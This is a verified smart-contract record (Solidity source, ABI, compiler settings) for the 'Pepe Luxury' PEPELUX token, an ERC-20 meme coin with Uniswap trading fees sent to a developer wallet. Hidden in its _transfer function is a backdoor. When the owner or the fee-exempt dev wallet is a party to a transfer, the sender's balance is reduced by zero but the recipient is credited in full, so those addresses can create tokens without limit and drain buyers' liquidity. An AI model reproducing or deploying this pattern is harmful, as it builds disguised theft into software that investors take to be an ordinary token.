{"SourceCode": "/**\r\nWeb: https://pepeluxury.io/\r\nTg: https://t.me/PepeLuxury\r\nX: https://twitter.com/PepeLuxury_io\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity = 0.8.21;\r\ninterface IUniswapRouterV1 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function swapExactETHForTokens(\r\n        uint amountOutMin, \r\n        address[] calldata path, \r\n        address to, uint deadline\r\n    ) external payable returns (uint[] memory amounts);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapRouterV2 is IUniswapRouterV1 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapFactoryV2 {\r\n    event PairCreated(address indexed token0, address indexed token1, address lpPairAddress, uint);\r\n    function getPair(address tokenA, address tokenB) external view returns (address lpPairAddress);\r\n    function createPair(address tokenA, address tokenB) external returns (address lpPairAddress);\r\n}\r\n\r\nabstract contract Context {\r\n    constructor() {\r\n    }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ncontract PEPELUX is Context, Ownable, IERC20 {\r\n\r\n    string constant private _name = \"Pepe Luxury\";\r\n    string constant private _symbol = \"PEPELUX\";\r\n    uint8 constant private _decimals = 9;\r\n\r\n    uint256 constant public _totalSupply = 10 ** 9 * 10**9;\r\n    uint256 constant public swapFeeMinTokens = _totalSupply / 100_000;\r\n    uint256 constant public transferTxFee = 0;\r\n    uint256 constant public feeDenominator = 1_000;\r\n    uint256 public buyTxFee = 64;\r\n    uint256 public sellTxFee = 64;\r\n    uint256 private _maxTxSize = 25 * _totalSupply / 1000;\r\n    bool private _swapTaxActivated = true;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _notIncludedInFee;\r\n    mapping (address => bool) private _hasPutLp;\r\n    mapping (address => bool) private _checkLpAddress;\r\n    mapping (address => uint256) private balance;\r\n\r\n    address public lpPairAddress;\r\n    IUniswapRouterV2 public uniswapRouter;\r\n    address payable private _devFeeAddress;\r\n    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    bool public tradeActive = true;\r\n    bool private swapping;\r\n    bool private hasNoTxLimit = false;\r\n\r\n    modifier inSwapFlag {\r\n        swapping = true;\r\n        _;\r\n        swapping = false;\r\n    }\r\n    event SwapAndLiquify();\r\n\r\n\r\n    constructor () {\r\n        uniswapRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _notIncludedInFee[msg.sender] = true;\r\n        _devFeeAddress = payable(address(0x02cC953B89AB26E50942Ce1bf40B3c02758370D4));\r\n        _notIncludedInFee[_devFeeAddress] = true;\r\n        _hasPutLp[msg.sender] = true;\r\n        balance[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n\r\n        lpPairAddress = IUniswapFactoryV2(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));\r\n        _checkLpAddress[lpPairAddress] = true;\r\n        _approve(msg.sender, address(uniswapRouter), type(uint256).max);\r\n        _approve(address(this), address(uniswapRouter), type(uint256).max);\r\n    }    \r\n    function swapBack(uint256 tokenAmount) internal inSwapFlag {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n\r\n        if (_allowances[address(this)][address(uniswapRouter)] != type(uint256).max) {\r\n            _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;\r\n        }\r\n\r\n        try uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        ) {} catch {\r\n            return;\r\n        }\r\n\r\n        if(address(this).balance > 0) _devFeeAddress.transfer(address(this).balance);\r\n    } \r\n    \r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function approve(address spender, uint256 amount) external override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function isSwapBack(address ins) internal view returns (bool) {\r\n        bool canswap = _swapTaxActivated && !_notIncludedInFee[ins];\r\n        return canswap;\r\n    }\r\n    \r\n    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {\r\n        bool takeFee = true;\r\n        require(to != address(0), \"Cannot transfer to DEAD address\");\r\n        require(from != address(0), \"Cannot transfer from DEAD address\");\r\n        require(amount > 0, \"Transfer token amount must be greater than zero\");\r\n\r\n        if (checkIfExcluded(from,to)) {\r\n            require(tradeActive,\"Trade is not started\");\r\n                    if(!_checkLpAddress[to] && from != address(this) && to != address(this) || checkTxTransfer(from,to) && !hasNoTxLimit)  { require(balanceOf(to) + amount <= _maxTxSize,\"_maxTxSize exceed\"); }}\r\n\r\n        if(checkTxSell(from, to) &&  !swapping && isSwapBack(from)) {\r\n\r\n            uint256 tokenAmount = balanceOf(address(this));\r\n            if(tokenAmount >= swapFeeMinTokens) { \r\n                if(amount > swapFeeMinTokens) swapBack(tokenAmount);\r\n             }\r\n        }\r\n\r\n        if (_notIncludedInFee[from] || _notIncludedInFee[to]){\r\n            takeFee = false;\r\n        }\r\n        uint256 amountAfterFee = (takeFee) ? getTransferValues(from, checkTxBuy(from, to), checkTxSell(from, to), amount) : amount;\r\n        uint256 amountBeforeFee = (takeFee) ? amount : (!tradeActive ? amount : 0);\r\n        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);\r\n\r\n        return true;\r\n    }\r\n\r\n    function checkIfExcluded(address ins, address out) internal view returns (bool) {\r\n        bool isLimited = ins != owner()\r\n            && out != owner()\r\n            && msg.sender != owner()\r\n            && !_hasPutLp[ins]  && !_hasPutLp[out] && out != address(0) && out != address(this);\r\n            return isLimited;\r\n    }\r\n    \r\n    function checkTxBuy(address ins, address out) internal view returns (bool) {\r\n        bool _is_buy = !_checkLpAddress[out] && _checkLpAddress[ins];\r\n        return _is_buy;\r\n    }\r\n\r\n    function checkTxSell(address ins, address out) internal view returns (bool) { \r\n        bool _is_sell = _checkLpAddress[out] && !_checkLpAddress[ins];\r\n        return _is_sell;\r\n    }\r\n\r\n    receive() external payable {}\r\n    \r\n                            \r\n    function _approve(address sender, address spender, uint256 amount) internal {\r\n        require(sender != address(0), \"Couldnt approve on Zero Address\");\r\n        require(spender != address(0), \"Couldnt approve on Zero Address\");\r\n\r\n        _allowances[sender][spender] = amount;\r\n    }\r\n    \r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            _allowances[sender][msg.sender] -= amount;\r\n        }\r\n\r\n        return _transfer(sender, recipient, amount);\r\n    }\r\n    \r\n    \r\n    function cancelLimits() external onlyOwner {\r\n        require(!hasNoTxLimit,\"Already done remove limits\");\r\n        _maxTxSize = _totalSupply;\r\n        hasNoTxLimit = true;\r\n        buyTxFee = 30;\r\n        sellTxFee = 30;\r\n    }\r\n    \r\n    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    \r\n    function getOwner() external view override returns (address) { return owner(); }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return balance[account];\r\n    }\r\n    \r\n    function checkTxTransfer(address ins, address out) internal view returns (bool) { \r\n        bool _is_transfer = !_checkLpAddress[out] && !_checkLpAddress[ins];\r\n        return _is_transfer;\r\n    }\r\n    \r\n    function getTransferValues(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {\r\n        uint256 fee;\r\n        if (isbuy)  fee = buyTxFee;  else if (issell)  fee = sellTxFee;  else  fee = transferTxFee; \r\n        if (fee == 0)  return amount; \r\n        uint256 feeAmount = amount * fee / feeDenominator;\r\n        if (feeAmount > 0) {\r\n            balance[address(this)] += feeAmount;\r\n            emit Transfer(from, address(this), feeAmount);\r\n        }\r\n        return amount - feeAmount;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DEAD\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cancelLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeDenominator\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpPairAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFeeMinTokens\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeActive\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferTxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapRouter\",\"outputs\":[{\"internalType\":\"contract IUniswapRouterV2\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "PEPELUX", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ba3c17d2946621d6717930959b5b9fe5010429b2cdf0ccbe661db67d470b3ea6"}